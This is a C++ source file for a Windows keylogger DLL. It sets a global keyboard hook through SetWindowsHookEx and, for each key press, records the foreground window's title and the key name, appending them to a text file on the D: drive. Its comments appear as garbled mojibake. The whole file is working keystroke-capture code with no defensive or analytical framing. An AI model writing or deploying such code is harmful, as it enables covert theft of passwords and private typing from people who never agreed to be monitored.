#include "KEYHOOK.h"
#include <stdio.h>
#include <string>
#include <filesystem>
using namespace std;
BOOL InstallHook()
{
	g_hook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, GetModuleHandle(L"KeyHook"), 0);
	if (g_hook == NULL)
	{
		return FALSE;
	}
	return TRUE;
}


BOOL UninstallHook()
{
	return UnhookWindowsHookEx(g_hook);
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{


	//�õ���ǰ�������ڵľ��
	HWND hWnd = ::GetActiveWindow();  //�õ�ǰ�����
	if (hWnd == NULL)
	{
		hWnd = ::GetForegroundWindow(); //�ö��㴰��
		if (hWnd == NULL)
		{
			return CallNextHookEx(g_hook, nCode, wParam, lParam);
		}
	}

	//�ñ���
	char windowsTextBuff[256] = { 0 };
	GetWindowTextA(hWnd, windowsTextBuff, 255);

	//ȥ�������õİ���
	if (nCode < 0 || nCode == HC_NOREMOVE)
	{
		return CallNextHookEx(g_hook, nCode, wParam, lParam);  //�ù������´�
	}

	if (lParam & 0x40000000) //����̧��
	{
		return CallNextHookEx(g_hook, nCode, wParam, lParam);
	}

	//��ȡ����
	char keyTextBuff[256] = { 0 };
	GetKeyNameTextA(lParam, keyTextBuff, 255);

	//���ļ�
	FILE* fp = fopen("D:\\dk.txt", "a");
	if (fp == NULL)
	{
		return CallNextHookEx(g_hook, nCode, wParam, lParam);
	}

	char buff[256] = { 0 };
	sprintf_s(buff, "%s:%s\n", windowsTextBuff, keyTextBuff);

	fwrite(buff, 1, strlen(buff), fp);
	fclose(fp);

	

	return CallNextHookEx(g_hook, nCode, wParam, lParam);
}
